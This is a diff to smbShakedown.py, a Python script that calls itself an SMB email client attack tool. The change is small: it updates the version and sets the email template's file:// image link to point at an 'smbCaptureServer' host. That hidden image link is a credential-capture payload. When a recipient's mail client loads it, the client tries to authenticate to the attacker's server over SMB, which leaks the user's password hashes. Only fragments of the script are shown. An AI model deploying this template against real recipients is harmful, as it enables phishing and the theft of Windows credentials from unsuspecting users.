@@ -1,7 +1,7 @@
 #/usr/bin/python
 # Description: A simplified SMB Email Client Attack script.
 # Created by: Nick Sanzotta / @beamr
-# Version: smbShakedown.py v 1.9112016
+# Version: smbShakedown.py v 1.9142016
 import os, sys, smtplib, getpass, readline, socket, time
 import urllib, json
 import readline
@@ -154,7 +154,7 @@ Subject: smbShakedown.py test.
 <img src=file://{4}/image/foo.gif>
 """
 ##########################################################
-	emailMessage = message.format(senderName, senderAddress, recipientName, recipientAddress, extipAddress)
+	emailMessage = message.format(senderName, senderAddress, recipientName, recipientAddress, smbCaptureServer)
 	print('Email Message Template Below:')
 	time.sleep(1)
 	print(emailMessage)
